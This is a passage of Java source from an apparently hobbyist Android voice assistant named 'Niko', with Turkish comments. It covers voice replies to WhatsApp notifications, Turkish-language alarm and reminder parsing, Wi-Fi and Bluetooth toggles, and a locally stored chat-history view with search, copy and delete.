                        lastRemoteInput = a.getRemoteInputs()[0];
                    }
                }
            }
        }
    }

    /**
     * Son gelen WhatsApp mesajını sesli okur.
     */
    private void readLastWhatsAppMessage() {
        if (lastWhatsAppMessage == null) {
            speak("Okunacak WhatsApp mesajı yok");
            return;
        }
        speak(lastWhatsAppSender + " şöyle yazmış: " + lastWhatsAppMessage);
    }

    /**
     * Son WhatsApp mesajına otomatik cevap gönderir.
     */
    private void replyWhatsApp(String msg) {

        // Bildirim erişim izni kontrolü
        if (!Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners")
                .contains(getPackageName())) {

            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            return;
        }

        if (lastReplyIntent == null || lastRemoteInput == null)
            return;

        // Cevap intentini oluştur ve gönder
        Intent i = new Intent();
        Bundle b = new Bundle();
        b.putCharSequence(lastRemoteInput.getResultKey(), msg);
        RemoteInput.addResultsToIntent(new RemoteInput[] { lastRemoteInput }, i, b);

        try {
            lastReplyIntent.send(this, 0, i);
        } catch (Exception ignored) {
        }
    }

    // ================= ALARM & HATIRLATICI MODÜLÜ =================

    /**
     * Sesli komuttan saat bilgisini ayrıştırıp alarm kurar.
     */
    private void setAlarm(String cmd) {
        String clean = cmd.toLowerCase(new Locale("tr", "TR"));
        int hour = -1;
        int minute = 0;

        // 1. GÖRELİ ZAMAN: "10 dakika sonra", "1 saat sonra"
        Pattern pRel = Pattern.compile("(\\d+)\\s*(dakika|dk|saat)\\s*sonra");
        Matcher mRel = pRel.matcher(clean);

        if (mRel.find()) {
            int val = Integer.parseInt(mRel.group(1));
            boolean isHour = mRel.group(2).startsWith("saat");

            Calendar cal = Calendar.getInstance();
            if (isHour)
                cal.add(Calendar.HOUR_OF_DAY, val);
            else
                cal.add(Calendar.MINUTE, val);

            hour = cal.get(Calendar.HOUR_OF_DAY);
            minute = cal.get(Calendar.MINUTE);
        } else {
            // 2. KESİN ZAMAN (ABSOLUTE TIME)
            boolean pm = clean.contains("akşam") || clean.contains("gece") || clean.contains("öğleden sonra");
            boolean half = clean.contains("buçuk") || clean.contains("yarım");

            // Formatlar: "07:30", "14.20", "19 45"
            Pattern p1 = Pattern.compile("(\\d{1,2})[.:\\s](\\d{2})");
            Matcher m1 = p1.matcher(clean);

            if (m1.find()) {
                hour = Integer.parseInt(m1.group(1));
                minute = Integer.parseInt(m1.group(2));
            } else {
                // Formatlar: "saat 7", "7 buçuk"
                Pattern p2 = Pattern.compile("saat\\s*(\\d{1,2})");
                Matcher m2 = p2.matcher(clean);

                if (m2.find()) {
                    hour = Integer.parseInt(m2.group(1));
                } else if (pm || half) {
                    // "saat" demese bile "akşam 8" veya "9 buçuk" dediyse sayıyı al
                    Pattern p3 = Pattern.compile("(\\d{1,2})");
                    Matcher m3 = p3.matcher(clean);
                    if (m3.find()) {
                        hour = Integer.parseInt(m3.group(1));
                    }
                }

                if (hour != -1 && half) {
                    minute = 30;
                }
            }

            // PM (Öğleden sonra) Düzeltmesi (12 saatlik formatı 24'e çevir)
            if (pm && hour != -1 && hour < 12) {
                hour += 12;
            }
        }

        if (hour != -1) {
            Intent i = new Intent(AlarmClock.ACTION_SET_ALARM);
            i.putExtra(AlarmClock.EXTRA_HOUR, hour);
            i.putExtra(AlarmClock.EXTRA_MINUTES, minute);
            i.putExtra(AlarmClock.EXTRA_MESSAGE, "Niko Alarm");
            i.putExtra(AlarmClock.EXTRA_SKIP_UI, true);
            startActivity(i);
            speak(String.format(Locale.getDefault(), "Alarm saat %02d:%02d için kuruldu", hour, minute));
        } else {
            // Saat anlaşılamazsa var olan alarmları göster
            Intent i = new Intent(AlarmClock.ACTION_SHOW_ALARMS);
            startActivity(i);
            speak("Saati tam anlayamadım, alarm listesini açıyorum.");
        }
    }

    private void setReminder(String cmd) {
        String clean = cmd.toLowerCase(new Locale("tr", "TR"));
        Calendar cal = Calendar.getInstance();
        boolean timeFound = false;

        // 1. GÜN: "yarın" kontrolü
        if (clean.contains("yarın")) {
            cal.add(Calendar.DAY_OF_YEAR, 1);
        }

        // 2. SAAT: Metin içinden saati bulma
        int hour = -1;
        int minute = 0;
        boolean pm = clean.contains("akşam") || clean.contains("gece") || clean.contains("öğleden sonra");
        boolean half = clean.contains("buçuk");

        Pattern p1 = Pattern.compile("(\\d{1,2})[.:\\s](\\d{2})");
        Matcher m1 = p1.matcher(clean);

        if (m1.find()) {
            hour = Integer.parseInt(m1.group(1));
            minute = Integer.parseInt(m1.group(2));
            timeFound = true;
        } else {
            Pattern p2 = Pattern.compile("saat\\s*(\\d{1,2})");
            Matcher m2 = p2.matcher(clean);
            if (m2.find()) {
                hour = Integer.parseInt(m2.group(1));
                timeFound = true;
            } else if (pm) {
                // "akşam 8'de"
                Pattern p3 = Pattern.compile("(\\d{1,2})");
                Matcher m3 = p3.matcher(clean);
                if (m3.find()) {
                    hour = Integer.parseInt(m3.group(1));
                    timeFound = true;
                }
            }
        }

        if (timeFound)

        {
            if (half)
                minute = 30;
            if (pm && hour < 12)
                hour += 12;

            cal.set(Calendar.HOUR_OF_DAY, hour);
            cal.set(Calendar.MINUTE, minute);
            cal.set(Calendar.SECOND, 0);
        }

        // Başlık Temizliği (Komuttan sadece hatırlatılacak metni çıkarmaya çalışır)
        String title = clean
                .replace("hatırlatıcı", "")
                .replace("hatırlat", "")
                .replace("bana", "")
                .replace("ekle", "")
                .replace("anımsat", "")
                .replace("kur", "")
                .replace("yarın", "") // Tarih bilgisini başlıktan çıkar
                .replace("bugün", "")
                .replace("saat", "")
                .replaceAll("\\d", "") // Sayıları da kabaca temizle
                .replace("buçuk", "")
                .replace("akşam", "")
                .replace("gece", "")
                .replace("sabah", "")
                .replace("de", "").replace("da", "").replace(" te", "").replace(" ta", "")
                .trim();

        if (title.isEmpty())
            title = "Hatırlatma";

        // İlk harfi büyüt
        if (title.length() > 0)
            title = title.substring(0, 1).toUpperCase() + title.substring(1);

        try {
            Intent intent = new Intent(Intent.ACTION_INSERT)
                    .setData(CalendarContract.Events.CONTENT_URI)
                    .putExtra(CalendarContract.Events.TITLE, title)
                    .putExtra(CalendarContract.Events.DESCRIPTION, "Niko Asistan Eklemesi");

            // Eğer saat bulunduysa o saate, bulunmadıysa tüm güne falan ayarlanabilir
            // (burada saat
            // şartı var)
            if (timeFound) {
                intent.putExtra(CalendarContract.EXTRA_EVENT_BEGIN_TIME, cal.getTimeInMillis());
                intent.putExtra(CalendarContract.EXTRA_EVENT_END_TIME, cal.getTimeInMillis() + 60 * 60 * 1000); // Varsayılan
                                                                                                                // 1
                                                                                                                // saat
            }
            startActivity(intent);

            String timeStr = timeFound ? String.format(Locale.getDefault(), " %02d:%02d", hour, minute) : "";
            String dayStr = clean.contains("yarın") ? " yarın" : "";
            speak("Hatırlatıcı" + dayStr + timeStr + " için açılıyor: " + title);

        } catch (Exception e) {
            speak("Takvim uygulaması bulunamadı.");
        }
    }

    // ================= SİSTEM KONTROLLERİ (WIFI / BLUETOOTH / PARLAKLIK)
    // =================

    /**
     * Wi-Fi bağlantısını açar veya kapatır.
     */
    private void controlWifi(boolean enable) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10 ve üzeri (SDK >= 29) için Panel açma
            // Android 10'da programatik Wi-Fi açma/kapama kısıtlandı.
            Intent panelIntent = new Intent(Settings.Panel.ACTION_INTERNET_CONNECTIVITY);
            startActivityForResult(panelIntent, 0);
            speak("Android 10 ve üzeri cihazlarda Wi-Fi ayarlar paneli açılıyor...");
        } else {
            // Eski sürümler için doğrudan WifiManager ile kontrol
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null) {
                wifiManager.setWifiEnabled(enable);
                speak(enable ? "Wi-Fi açıldı" : "Wi-Fi kapatıldı");
            } else {
                speak("Wi-Fi servisine erişilemedi.");
            }
        }
    }

    /**
     * Bluetooth bağlantısını açar veya kapatır.
     */
    private void controlBluetooth(boolean enable) {
        BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        if (bluetoothAdapter == null) {
            speak("Bu cihazda Bluetooth desteklenmiyor.");
            return;
        }

        // Android 12 (SDK 31) ve üzeri için ekstra izin kontrolü
        if (Build.VERSION.SDK_INT >= 31) {
            if (checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[] { Manifest.permission.BLUETOOTH_CONNECT }, PERMISSION_CODE);
                speak("Bluetooth izni gerekli.");
                return;
            }
        }

        if (enable) {
            if (!bluetoothAdapter.isEnabled()) {
                bluetoothAdapter.enable(); // Not: Bazı yeni Android sürümlerinde sadece panel açılabiliyor olabilir
                speak("Bluetooth açılıyor");
            } else {
                speak("Bluetooth zaten açık");
            }
        } else {
            if (bluetoothAdapter.isEnabled()) {
                bluetoothAdapter.disable();
                speak("Bluetooth kapatılıyor");
            } else {
                speak("Bluetooth zaten kapalı");
            }
        }
    }

    /**
     * İnternet bağlantısının olup olmadığını kontrol eder.
     */
    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
        } catch (Exception e) {
            // İzin hatası vs olursa varsayılan olarak true dön, askAI hata versin
            return true;
        }
    }

    // ================= SOHBET GEÇMİŞİ (CHAT HISTORY) =================

    /**
     * Mesajı yerel hafızaya kaydeder.
     */
    private void saveToHistory(String sender, String message) {
        // Boş veya çok kısa mesajları kaydetme
        if (message == null || message.trim().isEmpty() || message.trim().length() < 2) {
            return;
        }

        new Thread(() -> {
            synchronized (historyLock) {
                try {
                    String currentHistory = historyPrefs.getString("data", "[]");
                    JSONArray historyArray = new JSONArray(currentHistory);

                    JSONObject entry = new JSONObject();
                    entry.put("sender", sender);
                    entry.put("message", message.trim());
                    entry.put("timestamp", System.currentTimeMillis());
                    entry.put("date", new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault()).format(new Date()));
                    entry.put("time", new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date()));

                    historyArray.put(entry);

                    // Son MAX_HISTORY_ITEMS mesajı tut
                    if (historyArray.length() > MAX_HISTORY_ITEMS) {
                        JSONArray newArray = new JSONArray();
                        for (int i = historyArray.length() - MAX_HISTORY_ITEMS; i < historyArray.length(); i++) {
                            newArray.put(historyArray.get(i));
                        }
                        historyArray = newArray;
                    }

                    historyPrefs.edit().putString("data", historyArray.toString()).apply();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    /**
     * Geçmiş panelini doldurur ve gösterir.
     */
    private void showHistory(String filter) {
        runOnUiThread(() -> {
            if (layoutHistory.getVisibility() != View.VISIBLE) {
                animateHistoryIn();
            }
            containerHistoryItems.removeAllViews();
            layoutHistory.setVisibility(View.VISIBLE);
            // Başlangıçta boş durumu gizle
            if (layoutHistoryEmpty != null) {
                layoutHistoryEmpty.setVisibility(View.GONE);
            }
        });

        new Thread(() -> {
            synchronized (historyLock) {
                try {
                    String currentHistory = historyPrefs.getString("data", "[]");
                    JSONArray historyArray = new JSONArray(currentHistory);
                    
                    // Statistics hesaplama
                    int totalMessages = historyArray.length();
                    int todayCount = 0;
                    int thisWeekCount = 0;
                    
                    // Bugünün ve bu haftanın tarihi
                    SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
                    String todayDate = dateFormat.format(new Date());
                    Calendar cal = Calendar.getInstance();
                    cal.add(Calendar.DAY_OF_YEAR, -7);
                    Date weekAgo = cal.getTime();

                    // İstatistikleri hesapla
                    for (int i = 0; i < historyArray.length(); i++) {
                        JSONObject entry = historyArray.getJSONObject(i);
                        String entryDate = entry.optString("date", "");
                        
                        if (entryDate.equals(todayDate)) {
                            todayCount++;
                        }
                        
                        try {
                            Date parsedDate = dateFormat.parse(entryDate);
                            if (parsedDate != null && parsedDate.after(weekAgo)) {
                                thisWeekCount++;
                            }
                        } catch (Exception ignored) {}
                    }
                    
                    // Stats kartlarını güncelle
                    final int finalTodayCount = todayCount;
                    final int finalThisWeekCount = thisWeekCount;
                    runOnUiThread(() -> {
                        if (txtStatTotalChats != null) txtStatTotalChats.setText(String.valueOf(totalMessages));
                        if (txtStatThisWeek != null) txtStatThisWeek.setText(String.valueOf(finalThisWeekCount));
                        if (txtStatToday != null) txtStatToday.setText(String.valueOf(finalTodayCount));
                    });

                    if (historyArray.length() == 0) {
                        runOnUiThread(() -> {
                            // Yeni dedicated boş durum görünümünü göster
                            if (layoutHistoryEmpty != null) {
                                layoutHistoryEmpty.setVisibility(View.VISIBLE);
                            }
                            txtHistoryStats.setText("SENKRONİZE • 0 KAYIT");
                        });
                        return;
                    }





                    String lastDate = "";
                    int visibleCount = 0;
                    String finalFilter = filter.toLowerCase(Locale.getDefault());

                    for (int i = 0; i < historyArray.length(); i++) {
                        JSONObject entry = historyArray.getJSONObject(i);
                        String sender = entry.getString("sender");
                        String message = entry.getString("message");
                        String time = entry.optString("time", "--:--");
                        String currentDate = entry.optString("date", "");

                        // Bir sonraki mesajı kontrol et (Pairing Logic)
                        JSONObject nextEntry = null;
                        if (i + 1 < historyArray.length()) {
                            nextEntry = historyArray.getJSONObject(i + 1);
                        }

                        boolean isPair = false;
                        // Eğer mevcut mesaj "Ben" ise ve sonraki "Niko" ise, bu bir çifttir.
                        if (sender.equalsIgnoreCase("Ben") && nextEntry != null && nextEntry.getString("sender").equalsIgnoreCase("Niko")) {
                            isPair = true;
                        }

                        // Filtreleme Kontrolü
                        if (!finalFilter.isEmpty()) {
                            boolean matchFound = false;
                            // Mevcut mesajda ara
                            if (message.toLowerCase(Locale.getDefault()).contains(finalFilter) ||
                                    sender.toLowerCase(Locale.getDefault()).contains(finalFilter)) {
                                matchFound = true;
                            }
                            // Eğer çiftse, diğer mesajda da ara
                            if (isPair && nextEntry != null) {
                                String nextMsg = nextEntry.getString("message");
                                if (nextMsg.toLowerCase(Locale.getDefault()).contains(finalFilter)) {
                                    matchFound = true;
                                }
                            }

                            if (!matchFound) {
                                if (isPair) i++; // Çifti komple atla
                                continue;
                            }
                        }

                        visibleCount++;
                        final int index = i; // Soru indeksi (silme işlemi için referans)
                        final String filterText = finalFilter;
                        
                        // Tarih başlığı
                        if (!currentDate.equals(lastDate) && !currentDate.isEmpty()) {
                            String dateToShow = currentDate;
                            runOnUiThread(() -> addDateHeaderUI(dateToShow));
                            lastDate = currentDate;
                        }

                        final String displayTime = finalFilter.isEmpty() ? time : currentDate + " " + time;

                        if (isPair) {
                            // Çift olarak ekle
                            final JSONObject finalNextEntry = nextEntry;
                            runOnUiThread(() -> addHistoryPairToUI(entry, finalNextEntry, displayTime, index, filterText));
                            i++; // Sonraki mesajı (Niko) işlenmiş say ve atla
                        } else {
                            // Tekil mesaj olarak ekle (Eski usul)
                            runOnUiThread(() -> addHistoryItemToUI(sender, message, displayTime, index, filterText));
                        }
                    }

                    final int finalVisibleCount = visibleCount;
                    runOnUiThread(() -> {
                        if (finalVisibleCount == 0 && !finalFilter.isEmpty()) {
                            addNoResultUI();
                        }
                        txtHistoryStats.setText("SENKRONİZE • " + finalVisibleCount + " KAYIT");
                    });

                } catch (Exception e) {
                    e.printStackTrace();
                    runOnUiThread(
                            () -> Toast.makeText(MainActivity.this, "Geçmiş yüklenemedi", Toast.LENGTH_SHORT).show());
                }
            }
        }).start();
    }

    private void addNoResultUI() {
        TextView noResult = new TextView(this);
        noResult.setText("Sonuç bulunamadı.");
        noResult.setTextColor(Color.parseColor("#55FFFFFF"));
        noResult.setTextSize(14);
        noResult.setGravity(android.view.Gravity.CENTER);
        noResult.setPadding(0, 64, 0, 0);
        containerHistoryItems.addView(noResult);
    }

    private void animateHistoryIn() {
        AnimationSet set = new AnimationSet(true);
        TranslateAnimation slide = new TranslateAnimation(0, 0, 1000, 0);
        AlphaAnimation fade = new AlphaAnimation(0, 1);
        set.addAnimation(slide);
        set.addAnimation(fade);
        set.setDuration(400);
        layoutHistory.startAnimation(set);
    }

    private void hideHistory() {
        // Eğer zaten gizliyse veya kapanıyorsa işlem yapma
        if (layoutHistory.getVisibility() != View.VISIBLE)
            return;

        // Klavyeyi gizle
        InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
        if (imm != null && edtHistorySearch != null)
            imm.hideSoftInputFromWindow(edtHistorySearch.getWindowToken(), 0);

        AnimationSet set = new AnimationSet(true);
        TranslateAnimation slide = new TranslateAnimation(0, 0, 0, 1200);
        AlphaAnimation fade = new AlphaAnimation(1, 0);
        set.addAnimation(slide);
        set.addAnimation(fade);
        set.setDuration(300);

        set.setAnimationListener(new Animation.AnimationListener() {
            @Override
            public void onAnimationStart(Animation animation) {
            }

            @Override
            public void onAnimationEnd(Animation animation) {
                layoutHistory.setVisibility(View.GONE);
                if (edtHistorySearch != null)
                    edtHistorySearch.setText("");
            }

            @Override
            public void onAnimationRepeat(Animation animation) {
            }
        });

        layoutHistory.startAnimation(set);
    }

    private int getHistoryCount() {
        synchronized (historyLock) {
            try {
                String currentHistory = historyPrefs.getString("data", "[]");
                return new JSONArray(currentHistory).length();
            } catch (Exception e) {
                return 0;
            }
        }
    }

    /**
     * Tarih başlığı ekler (örn: "05/01/2026") - Premium neon badge tasarımı
     */
    private void addDateHeaderUI(String date) {
        LinearLayout.LayoutParams wrapperParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        wrapperParams.setMargins(0, 24, 0, 16);

        // Wrapper layout (ortalama için)
        LinearLayout wrapper = new LinearLayout(this);
        wrapper.setLayoutParams(wrapperParams);
        wrapper.setGravity(android.view.Gravity.CENTER);
        wrapper.setOrientation(LinearLayout.HORIZONTAL);

        // Badge container
        TextView dateHeader = new TextView(this);
        dateHeader.setText(formatDateHeader(date));
        dateHeader.setTextColor(Color.parseColor("#00FBFF"));
        dateHeader.setTextSize(10);
        dateHeader.setGravity(android.view.Gravity.CENTER);
        dateHeader.setAllCaps(true);
        dateHeader.setLetterSpacing(0.15f);
        dateHeader.setPadding(32, 12, 32, 12);
        dateHeader.setBackgroundResource(R.drawable.history_date_badge_bg);
        dateHeader.setTypeface(android.graphics.Typeface.create("sans-serif-bold", android.graphics.Typeface.NORMAL));

        wrapper.addView(dateHeader);
        containerHistoryItems.addView(wrapper);
    }

    /**
     * Tarihi daha okunabilir formata çevirir
     */
    private String formatDateHeader(String date) {
        try {
            SimpleDateFormat inputFormat = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
            SimpleDateFormat outputFormat = new SimpleDateFormat("dd MMMM yyyy, EEEE", new Locale("tr", "TR"));
            Date parsedDate = inputFormat.parse(date);

            // Bugün mü kontrol et
            SimpleDateFormat todayFormat = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
            String today = todayFormat.format(new Date());
            if (date.equals(today)) {
                return "BUGÜN";
            }

            return outputFormat.format(parsedDate).toUpperCase(new Locale("tr", "TR"));
        } catch (Exception e) {
            return date;
        }
    }



    /**
     * Tek bir geçmiş öğesini arayüz (UI) içine ekler.
     */
    private void addHistoryItemToUI(String sender, String message, String time, int index, String filter) {
        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cardParams.setMargins(0, 0, 0, 20);

        LinearLayout itemLayout = new LinearLayout(this);
        itemLayout.setOrientation(LinearLayout.VERTICAL);
        itemLayout.setPadding(32, 28, 32, 28);
        itemLayout.setBackgroundResource(R.drawable.history_card_bg);
        itemLayout.setLayoutParams(cardParams);
        itemLayout.setClickable(true);
        itemLayout.setFocusable(true);

        // Kısa basınca metni kopyala
        itemLayout.setOnClickListener(v -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("niko_msg", message);
            clipboard.setPrimaryClip(clip);
            vibrateFeedback();
            Toast.makeText(this, "Mesaj kopyalandı", Toast.LENGTH_SHORT).show();
        });

        // Uzun basınca tekli silme
        itemLayout.setOnLongClickListener(v -> {
            vibrateFeedback();
            deleteSingleHistoryItem(index);
            return true;
        });

        // Üst kısım: Gönderen ve Saat
        RelativeLayout header = new RelativeLayout(this);
        header.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        TextView txtSender = new TextView(this);
        boolean isUser = sender.toLowerCase().contains("ben") || sender.toLowerCase().contains("siz");
        txtSender.setText(isUser ? "● SİZ" : "● NİKO");
        txtSender.setTextColor(isUser ? Color.parseColor("#00FBFF") : Color.parseColor("#FFD700"));
        txtSender.setTextSize(10);
        txtSender.setAllCaps(true);
        txtSender.setLetterSpacing(0.2f);
        txtSender.setTypeface(android.graphics.Typeface.create("sans-serif-black", android.graphics.Typeface.NORMAL));

        TextView txtTime = new TextView(this);
        txtTime.setText(time);
        txtTime.setTextColor(Color.parseColor("#4DFFFFFF"));
        txtTime.setTextSize(10);
        txtTime.setLetterSpacing(0.05f);
        RelativeLayout.LayoutParams timeParams = new RelativeLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        timeParams.addRule(RelativeLayout.ALIGN_PARENT_END);
        txtTime.setLayoutParams(timeParams);

        header.addView(txtSender);
        header.addView(txtTime);

        // Mesaj içeriği
        TextView txtMsg = new TextView(this);
        if (filter != null && !filter.isEmpty()) {
            SpannableString spannable = new SpannableString(message);
            String lowerMsg = message.toLowerCase(Locale.getDefault());
            int start = lowerMsg.indexOf(filter);
            while (start >= 0) {
                int end = start + filter.length();
                spannable.setSpan(new BackgroundColorSpan(Color.parseColor("#6600E5FF")), start, end,
                        Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                start = lowerMsg.indexOf(filter, end);
            }
            txtMsg.setText(spannable);
        } else {
            txtMsg.setText(message);
        }

        txtMsg.setTextColor(Color.parseColor("#E6FFFFFF")); // Saf beyaz yerine hafif kırık beyaz
        txtMsg.setTextSize(14);
        txtMsg.setPadding(0, 12, 0, 0);
        txtMsg.setLineSpacing(6, 1.2f);
        txtMsg.setAlpha(0.9f);

        itemLayout.addView(header);
        itemLayout.addView(txtMsg);
        containerHistoryItems.addView(itemLayout);
    }

    /**
     * Soru ve Cevabı tek bir kart (Interaction Pair) olarak ekler.
     */
    private void addHistoryPairToUI(JSONObject userEntry, JSONObject aiEntry, String time, int index, String filter) {
        try {
            String userMsg = userEntry.getString("message");
            String aiMsg = aiEntry.getString("message");

            LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            cardParams.setMargins(0, 0, 0, 24); // Kartlar arası boşluk

            LinearLayout itemLayout = new LinearLayout(this);
            itemLayout.setOrientation(LinearLayout.VERTICAL);
            itemLayout.setPadding(32, 24, 32, 24);
            itemLayout.setBackgroundResource(R.drawable.history_card_bg);
            itemLayout.setLayoutParams(cardParams);
            itemLayout.setClickable(true);
            itemLayout.setFocusable(true);

            // Tıklayınca AI cevabını kopyala
            itemLayout.setOnClickListener(v -> {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("niko_reply", aiMsg);
                clipboard.setPrimaryClip(clip);
                vibrateFeedback();
                Toast.makeText(this, "Niko'nun cevabı kopyalandı", Toast.LENGTH_SHORT).show();
            });

            // Uzun basınca sil (Index sorunun indeksidir, silme mantığı ikisini de silmeli mi?
            // deleteSingleHistoryItem sadece bir item siliyor.
            // Eğer çifti silmek istiyorsak, ardışık iki item silmeliyiz.
            // Bu yüzden custom bir silme mantığı gerekebilir veya kullanıcıya sorulabilir.
            // Şimdilik sadece soruyu (ve dolayısıyla kaymayı) tetikleyeceği için dikkatli olunmalı.
            // En iyisi tek tek silmek yerine "Bu konuşmayı sil" demek.
            itemLayout.setOnLongClickListener(v -> {
                vibrateFeedback();
                // Çift silme onayı
                new androidx.appcompat.app.AlertDialog.Builder(this)
                        .setTitle("Anıyı Sil")
                        .setMessage("Bu konuşma geçmişten silinsin mi?")
                        .setPositiveButton("Sil", (dialog, which) -> {
                            deleteHistoryPair(index); // Yeni metod gerekli
                        })
                        .setNegativeButton("İptal", null)
                        .show();
                return true;
            });

            // HEADER: Zaman Damgası (Sağ Üst)
            RelativeLayout header = new RelativeLayout(this);
            header.setLayoutParams(new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
            
            TextView txtTime = new TextView(this);
            txtTime.setText(time);
            txtTime.setTextColor(Color.parseColor("#4DFFFFFF"));
            txtTime.setTextSize(10);
            txtTime.setLetterSpacing(0.05f);
            RelativeLayout.LayoutParams timeParams = new RelativeLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            timeParams.addRule(RelativeLayout.ALIGN_PARENT_END);
            txtTime.setLayoutParams(timeParams);
            header.addView(txtTime);
            itemLayout.addView(header);

            // 1. BÖLÜM: KULLANICI (SORU)
            TextView txtUserLabel = new TextView(this);
            txtUserLabel.setText("● SİZ");
            txtUserLabel.setTextColor(Color.parseColor("#00FBFF")); // Cyan
            txtUserLabel.setTextSize(10);
            txtUserLabel.setAllCaps(true);
            txtUserLabel.setLetterSpacing(0.2f);
            txtUserLabel.setTypeface(android.graphics.Typeface.create("sans-serif-black", android.graphics.Typeface.NORMAL));
            itemLayout.addView(txtUserLabel);

            TextView txtUserMsg = new TextView(this);
            // Filtreleme vurgusu
            if (filter != null && !filter.isEmpty()) {
                SpannableString spannable = new SpannableString(userMsg);
                String lowerMsg = userMsg.toLowerCase(Locale.getDefault());
                int start = lowerMsg.indexOf(filter);
                while (start >= 0) {
                    int end = start + filter.length();
                    spannable.setSpan(new BackgroundColorSpan(Color.parseColor("#6600E5FF")), start, end, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                    start = lowerMsg.indexOf(filter, end);
                }
                txtUserMsg.setText(spannable);
            } else {
                txtUserMsg.setText(userMsg);
            }
            txtUserMsg.setTextColor(Color.WHITE);
            txtUserMsg.setTextSize(14);
            txtUserMsg.setPadding(0, 8, 0, 0);
            txtUserMsg.setLineSpacing(4, 1.1f);
            itemLayout.addView(txtUserMsg);

            // AYIRICI ÇİZGİ
            View divider = new View(this);
            LinearLayout.LayoutParams dividerParams = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, 1); // 1px yükseklik
            dividerParams.setMargins(0, 24, 0, 24);
            divider.setLayoutParams(dividerParams);
            divider.setBackgroundColor(Color.parseColor("#1AFFFFFF")); // %10 opacity beyaz
            itemLayout.addView(divider);

            // 2. BÖLÜM: NIKO (CEVAP)
            TextView txtAiLabel = new TextView(this);
            txtAiLabel.setText("● NİKO");
            txtAiLabel.setTextColor(Color.parseColor("#FFD700")); // Gold
            txtAiLabel.setTextSize(10);
            txtAiLabel.setAllCaps(true);
            txtAiLabel.setLetterSpacing(0.2f);
            txtAiLabel.setTypeface(android.graphics.Typeface.create("sans-serif-black", android.graphics.Typeface.NORMAL));
            itemLayout.addView(txtAiLabel);

            TextView txtAiMsg = new TextView(this);
            // Filtreleme vurgusu
            if (filter != null && !filter.isEmpty()) {
                SpannableString spannable = new SpannableString(aiMsg);
                String lowerMsg = aiMsg.toLowerCase(Locale.getDefault());
                int start = lowerMsg.indexOf(filter);
                while (start >= 0) {
                    int end = start + filter.length();
                    spannable.setSpan(new BackgroundColorSpan(Color.parseColor("#6600E5FF")), start, end, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                    start = lowerMsg.indexOf(filter, end);
                }
                txtAiMsg.setText(spannable);
            } else {
                txtAiMsg.setText(aiMsg);
            }
            txtAiMsg.setTextColor(Color.parseColor("#E6FFFFFF")); // Kırık beyaz
            txtAiMsg.setTextSize(14);
            txtAiMsg.setPadding(0, 8, 0, 0);
            txtAiMsg.setLineSpacing(6, 1.2f);
            itemLayout.addView(txtAiMsg);

            containerHistoryItems.addView(itemLayout);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Soru-Cevap çiftini siler (İki kayıt birden).
     */
    private void deleteHistoryPair(int index) {
        synchronized (historyLock) {
            try {
                String currentHistory = historyPrefs.getString("data", "[]");
                JSONArray historyArray = new JSONArray(currentHistory);
                
                // İndeks kontrolü
                if (index < 0 || index + 1 >= historyArray.length()) return;

                // remove metodu diziyi kaydırır, bu yüzden index'i iki kere silmek yeterli
                // Önce ikinci elemanı (cevap - index+1) sil, sonra birinciyi (soru - index) sil.
                // Ancak remove(int) metodu API 19 gerektirir. Android sürümleri destekliyorsa sorun yok.
                // JSONArray.remove(int) API level 19'da eklendi.
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                    historyArray.remove(index + 1); // Cevabı sil
                    historyArray.remove(index);     // Soruyu sil
                } else {
                    // API < 19 için workaround: List'e çevir
                    // (Bu proje modern göründüğü için muhtemelen API 19+ ama yine de güvenli yol)
                    // Basitlik için sadece showHistory'yi yenileyecek bir çözüm yapalım.
                    // Aslında remove işlemi için yeni bir JSONArray oluşturmak daha safe olabilir.
                    JSONArray newArray = new JSONArray();
                    for (int i=0; i<historyArray.length(); i++) {
                        if (i != index && i != index+1) {
                            newArray.put(historyArray.get(i));
